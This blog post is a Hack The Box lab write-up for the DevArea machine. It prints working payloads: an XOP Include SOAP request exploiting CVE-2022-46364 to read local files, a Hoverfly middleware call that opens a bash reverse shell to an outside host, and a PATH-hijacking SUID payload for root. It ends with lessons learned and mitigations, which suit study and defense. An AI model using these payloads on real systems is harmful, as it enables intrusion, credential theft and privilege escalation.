---
title: "HTB Walkthrough: DevArea"
date: 2026-03-29
draft: false
description: "Full walkthrough of the DevArea machine from Hack The Box. Medium difficulty, Linux Ubuntu. CVE-2022-46364 on Apache CXF to read arbitrary files via XOP Include, Hoverfly credentials exposed in systemd, RCE via Middleware, and root escalation through PATH Hijacking in a sudo script."
tags: ["HackTheBox", "Linux", "Medium", "FTP", "SOAP", "ApacheCXF", "CVE-2022-46364", "XOPInclude", "LFI", "Hoverfly", "MiddlewareRCE", "PATHHijacking", "SUID", "Sudo", "PrivEsc", "RCE", "devarea", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **DevArea** on Hack The Box. **Medium** difficulty machine running **Linux Ubuntu**. A Java SOAP service downloaded via anonymous FTP turns out to be Apache CXF 3.2.14, vulnerable to **CVE-2022-46364** (XOP Include LFI). We use the flaw to read Hoverfly credentials from the systemd configuration and get RCE through the Middleware system. Root escalation exploits **PATH Hijacking** in a script executed with `sudo`.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                                                     |
|----------------|--------------------------------------------------------------------------------------------|
| **Name**       | DevArea                                                                                    |
| **OS**         | Linux (Ubuntu)                                                                             |
| **Difficulty** | Medium                                                                                     |
| **IP**         | 10.129.10.216                                                                              |
| **Techniques** | CVE-2022-46364 · XOP Include LFI · Hoverfly Middleware RCE · Bash PATH Hijacking · SUID   |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.10.216
```

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
8500/tcp open  fmtp
8888/tcp open  sun-answerbook
```

Version and scripts scan on open ports:

```bash
nmap -sC -sV -p21,22,80,8080,8500,8888 10.129.10.216
```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://devarea.htb/
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-title: Error 404 Not Found
8500/tcp open  http    Golang net/http server (Proxy — requires auth)
8888/tcp open  http    Golang net/http server
|_http-title: Hoverfly Dashboard
```

*Open ports:*
- `21` → FTP vsftpd with **anonymous login enabled**
- `22` → OpenSSH 9.6p1, no known public exploits
- `80` → Apache 2.4.58 with virtual hosting to `devarea.htb`
- `8080` → Jetty 9.4.27 — Java service, returns 404 at root
- `8500` → Go proxy with authentication
- `8888` → **Hoverfly Dashboard** — service virtualization tool

> **💡 Attack surface:** The combination of anonymous FTP + Jetty + Hoverfly is unusual. FTP likely exposes some artifact of the service running on Jetty; Hoverfly is a tool that can execute code if we authenticate.

---

## 2. Web and FTP Enumeration

### 2.1 Web Enumeration (Port 80)

We add `devarea.htb` to `/etc/hosts` and run gobuster in vhost mode:

```bash
sudo sh -c "echo '10.129.10.216 devarea.htb' >> /etc/hosts"
gobuster vhost -u http://devarea.htb -w subdomains.txt
```

```
Found: weather.devarea.htb  → 302 → http://devarea.htb/
Found: webapps.devarea.htb  → 302 → http://devarea.htb/
Found: node1.devarea.htb    → 302 → http://devarea.htb/
```

All subdomains redirect to the main page. The static web and port 8080 have no actionable content via directory enumeration.

### 2.2 Anonymous FTP

```bash
ftp 10.129.10.216
# User: anonymous / No password
```

```
ftp> ls pub
-rw-r--r--  1 ftp  ftp  6445030 Sep 22 2025 employee-service.jar
ftp> get employee-service.jar
```

We download the JAR — a Java service presumably running on port 8080.

---

## 3. JAR Analysis — Reverse Engineering

We decompile the JAR with `jadx`:

```bash
jadx -d /root/decompiled/ /root/employee-service.jar
```

Relevant files are in `sources/htb/devarea/`. We filter the application code by excluding Apache, Jetty, and javax dependencies:

```bash
find sources/ -name "*.java" | grep -vE "apache|jetty|javax|ibm"
```

```
sources/htb/devarea/Report.java
sources/htb/devarea/ServerStarter.java
sources/htb/devarea/EmployeeServiceImpl.java
sources/htb/devarea/EmployeeService.java
```

### 3.1 `ServerStarter.java` — SOAP Endpoint

```java
public class ServerStarter {
    public static void main(String[] args) {
        JaxWsServerFactoryBean factory = new JaxWsServerFactoryBean();
        factory.setServiceClass(EmployeeService.class);
        factory.setServiceBean(new EmployeeServiceImpl());
        factory.setAddress("http://0.0.0.0:8080/employeeservice");
        factory.create();
        System.out.println("WSDL available at http://localhost:8080/employeeservice?wsdl");
    }
}
```

> **💡 Key discovery:** The service exposes a SOAP endpoint at `http://devarea.htb:8080/employeeservice`. The WSDL at `/employeeservice?wsdl` describes its full interface.

### 3.2 `EmployeeServiceImpl.java` — The Reflected Field

```java
public String submitReport(Report report) {
    String greeting = report.isConfidential()
        ? "Report marked confidential. Thank you, " + report.getEmployeeName()
        : "Report received from " + report.getEmployeeName();
    return greeting + ". Department: " + report.getDepartment()
                    + ". Content: " + report.getContent();
}
```

> **💡 Key:** The `content` field is **reflected back in the response**. If we can inject file contents into that field, we'll see them in the response.

### 3.3 `pom.xml` — Apache CXF Version

```bash
cat resources/META-INF/maven/com.environment/employee-service/pom.xml
```

```xml
<dependency>
    <groupId>org.apache.cxf</groupId>
    <artifactId>cxf-rt-frontend-jaxws</artifactId>
    <version>3.2.14</version>
</dependency>
```

> **⚠️ Vulnerable version:** Apache CXF **3.2.14** is affected by **CVE-2022-46364** (versions before 3.5.5 and 3.4.10). This CVE allows reading arbitrary server files via Multipart SOAP messages with XOP Include elements.

---

## 4. Exploitation — CVE-2022-46364 (XOP Include LFI)

The attack uses **XOP (XML-binary Optimized Packaging)** inside a **Multipart SOAP** message. Instead of an HTTP URL, we pass a local file path in the `href` attribute of the `xop:Include` element. The server processes the entity, reads the file, and returns it **Base64-encoded** in the response.

```
Normal flow:    content field = "text" → SOAP response with that text reflected
Malicious flow: content field = <xop:Include href="file:///path"/> →
                CXF resolves the reference, reads the local file, returns content in Base64
```

### 4.1 Service Verification

Before exploiting, we confirm the SOAP endpoint responds correctly:

```bash
curl -X POST \
  -H 'Content-Type: multipart/related; type="text/xml"; boundary="boundary"; start="<main>"' \
  -H 'SOAPAction: ""' \
  --data-binary @- \
  http://devarea.htb:8080/employeeservice <<'EOF'
--boundary
Content-Type: text/xml; charset=UTF-8
Content-ID: <main>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:dev="http://devarea.htb/">
  <soapenv:Header/>
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>TEST_CONTENT</content>
        <department>IT</department>
        <employeeName>Hacker</employeeName>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
--boundary--
EOF
```

```xml
<return>Report received from Hacker. Department: IT. Content: TEST_CONTENT</return>
```

The `content` field is reflected.

### 4.2 Reading `/etc/passwd`

We replace the text with an `xop:Include` element pointing to the file:

```bash
curl -X POST \
  -H 'Content-Type: multipart/related; type="text/xml"; boundary="boundary"; start="<main>"' \
  -H 'SOAPAction: ""' \
  --data-binary @- \
  http://devarea.htb:8080/employeeservice <<'EOF'
--boundary
Content-Type: text/xml; charset=UTF-8
Content-ID: <main>

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:dev="http://devarea.htb/">
  <soapenv:Header/>
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>
          <xop:Include href="file:///etc/passwd"
                       xmlns:xop="http://www.w3.org/2004/08/xop/include"/>
        </content>
        <department>IT</department>
        <employeeName>Hacker</employeeName>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
--boundary--
EOF
```

The response contains `/etc/passwd` Base64-encoded:

```
Content: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
```

```bash
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo..." | base64 -d
```

```
root:x:0:0:root:/root:/bin/bash
...
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
```

> **💡 Users of interest:**
> - `dev_ryan` — only normal user with a shell (`/bin/bash`)
> - `syswatch` — service user at `/opt/syswatch`; relevant for privesc

### 4.3 Reading the Hoverfly Service (systemd)

With the same method we read the port 8888 service configuration:

```xml
<xop:Include href="file:///etc/systemd/system/hoverfly.service"
             xmlns:xop="http://www.w3.org/2004/08/xop/include"/>
```

```bash
echo "W1VuaXRdCk..." | base64 -d
```

```ini
[Unit]
Description=HoverFly service
After=network.target
[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
[Install]
WantedBy=multi-user.target
```

> **🔑 Credentials found:** `admin:O7IJ27MyyXiU` for Hoverfly on port 8888. Credentials are in plaintext in the process startup parameter — visible in `/proc`, in the journald log, and in any service configuration file.

---

## 5. RCE via Hoverfly Middleware

**Hoverfly** is a service virtualization tool that can execute external scripts ("middleware") to process intercepted traffic in real time. The middleware receives each request/response as JSON via stdin and returns the modified response via stdout. If we configure as middleware a script that launches a reverse shell, the server will execute it in the context of the `dev_ryan` user.

### 5.1 Get the JWT Token

```bash
curl -s -X POST http://devarea.htb:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"O7IJ27MyyXiU"}'
```

```json
{"token":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU4..."}
```

### 5.2 Configure the Middleware with Reverse Shell

We open a listener on our machine:

```bash
nc -lvnp 4444
```

We send the payload to the middleware endpoint. The `binary` field specifies the interpreter and `script` the code to execute:

```bash
curl -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..." \
  -H "Content-Type: application/json" \
  -d '{
    "binary": "/bin/bash",
    "script": "bash -i >& /dev/tcp/10.10.15.237/4444 0>&1",
    "remote": ""
  }'
```

```
Listening on 0.0.0.0 4444
Connection received on 10.129.10.216 37422
bash: no job control in this shell
dev_ryan@devarea:/opt/HoverFly$
```

✅ **Shell obtained as `dev_ryan`.**

---

## 6. User Flag

```bash
dev_ryan@devarea:~$ cat user.txt
```

> 🔑 User flag obtained.

---

## 7. Privilege Escalation — Bash PATH Hijacking

### 7.1 Sudo Permission Enumeration

```bash
dev_ryan@devarea:~$ sudo -l
```

```
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh,
    !/opt/syswatch/syswatch.sh web-stop,
    !/opt/syswatch/syswatch.sh web-restart
```

Rule analysis:
- ✅ We can run `/opt/syswatch/syswatch.sh` as root without a password
- ❌ The `web-stop` and `web-restart` arguments are blocked (`!` prefix)
- The script and its directory are not directly accessible:

```bash
dev_ryan@devarea:~$ ls -la /opt/syswatch/
ls: cannot open directory '/opt/syswatch/': Permission denied
```

### 7.2 The Vulnerability — PATH Hijacking

The `syswatch.sh` script likely invokes system commands (`ps`, `grep`, `date`, etc.) **without absolute paths**. When bash executes a command by name, it searches through `$PATH` directories left-to-right. If we place a malicious executable with the same name in a directory that appears first in PATH, bash will execute it instead of the legitimate binary — with root privileges.

```
Normal flow:    syswatch.sh calls "ps" → bash searches PATH → /bin/ps
Malicious flow: PATH=/tmp:... → bash searches /tmp first → /tmp/ps (our payload) → executed as root
```

### 7.3 Create the SUID Payload

```bash
cat > /tmp/payload.sh << 'EOF'
#!/bin/sh
cp /bin/sh /tmp/root_sh && chmod +s /tmp/root_sh
EOF
chmod +x /tmp/payload.sh
```

The payload copies `/bin/sh` to `/tmp/root_sh` and activates the **SUID bit** (`+s`). Any user executing `/tmp/root_sh` will do so with the permissions of the binary's owner — which after being copied by root will be **root**.

To cover the most common commands without knowing which one the script uses internally:

```bash
for cmd in ps grep date id cat ls; do
    ln -s /tmp/payload.sh /tmp/$cmd
done
```

### 7.4 Hijack PATH and Execute the Script as Root

```bash
export PATH=/tmp:$PATH
sudo /opt/syswatch/syswatch.sh --version
```

The first command without an absolute path found in the script will execute our payload. Root copies `/bin/sh` and sets the SUID bit.

### 7.5 Get the Root Shell

```bash
/tmp/root_sh -p
```

```
# id
uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root) egid=0(root)
```

> **`-p`:** Activates sh's "privileged" mode, which doesn't drop the elevated EUID at startup. Without this flag, the shell would discard the SUID bit as a modern security measure.

✅ **Escalation to root completed.**

---

## 8. Root Flag

```bash
# cat /root/root.txt
```

> 🏁 Root flag obtained.

---

## 9. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Anonymous FTP exposes `employee-service.jar`; Hoverfly Dashboard on port 8888.
2. **Reversing** → `jadx` on the JAR → Apache CXF 3.2.14 → CVE-2022-46364; `content` field reflected.
3. **CVE-2022-46364** → XOP Include LFI → `/etc/passwd` (users) + `/etc/systemd/system/hoverfly.service` (credentials).
4. **Hoverfly credentials** → `admin:O7IJ27MyyXiU` → JWT token → Middleware RCE → shell as `dev_ryan`.
5. **User flag** → `~/user.txt`.
6. **PrivEsc** → `sudo` without password on `syswatch.sh` → PATH Hijacking → SUID binary → root.

**What I learned from this machine:**

- **Anonymous FTP can expose more than data — it can expose the target's source code.** The downloaded JAR contained the exact version of the vulnerable dependency. Without that information, finding the attack vector would have required blind fuzzing of the SOAP service. Reading the code first turned a blind search into a targeted attack.

- **CVE-2022-46364 is an example of why third-party dependencies need to be on the security team's radar.** The application code itself has no bugs — the problem is in the SOAP message parsing library. Maintaining an up-to-date inventory of dependencies (SBOM) and monitoring CVEs against that inventory is the only way to detect this type of exposure before an attacker does.

- **XOP was designed to efficiently include binaries in SOAP messages; the `file://` abuse is a consequence of the parser not validating the URI scheme.** The fix in CXF 3.5.5 consisted precisely of blocking URI schemes other than `http://` and `https://` in `xop:Include`. It's an example of failing open by default: the library accepted any valid URI without scheme restriction.

- **Credentials in process startup parameters are visible to any system user.** The `ExecStart` command in systemd with `-password O7IJ27MyyXiU` appears in `/proc/<pid>/cmdline`, in the journald log, and in the service configuration file. If the LFI hadn't existed, `ps aux` from any user with system access would have revealed the same password.

- **PATH Hijacking in sudo scripts is one of the most underrated privesc vectors.** People check SUID, capabilities, and crons, but don't always verify whether privileged scripts call binaries with relative paths. The defense is trivial: use `/bin/ps` instead of `ps`, and `secure_path` in sudoers.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| Anonymous FTP with internal binaries | Disable anonymous access; don't expose development artifacts in production |
| Apache CXF 3.2.14 (CVE-2022-46364) | Update to CXF ≥ 3.5.5 or ≥ 3.4.10 |
| Credentials in process parameters (systemd) | Use `EnvironmentFile` with a secrets file; CLI arguments are visible to all system users |
| Hoverfly Middleware accessible from network | Bind only to `127.0.0.1`; restrict API with firewall if remote access isn't needed |
| `sudo` over script with binaries lacking absolute paths | Add `secure_path` in sudoers; use absolute paths in all script commands |
| Exploitable SUID bit post-escalation | Regularly audit `find / -perm -4000 2>/dev/null`; monitor changes in `/tmp` |
